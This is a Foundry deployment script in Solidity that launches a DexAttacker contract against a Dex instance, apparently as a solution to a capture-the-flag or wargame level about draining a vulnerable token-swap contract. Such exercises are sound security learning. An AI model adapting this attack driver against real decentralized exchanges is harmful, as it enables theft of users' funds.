// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./DexAttacker.sol";

contract DexAttackerScript is Script {
    function run(address instanceAddr) external {
        vm.startBroadcast();

        DexAttacker attacker = new DexAttacker();
        Dex instance = Dex(instanceAddr);
        SwappableToken(instance.token1()).transfer(address(attacker), 10);
        SwappableToken(instance.token2()).transfer(address(attacker), 10);
        // token1.transfer(address(attacker), token1.balanceOf(address(this)));
        // token2.transfer(address(attacker), token2.balanceOf(address(this)));
        attacker.attack(instanceAddr);

        vm.stopBroadcast();
    }
}
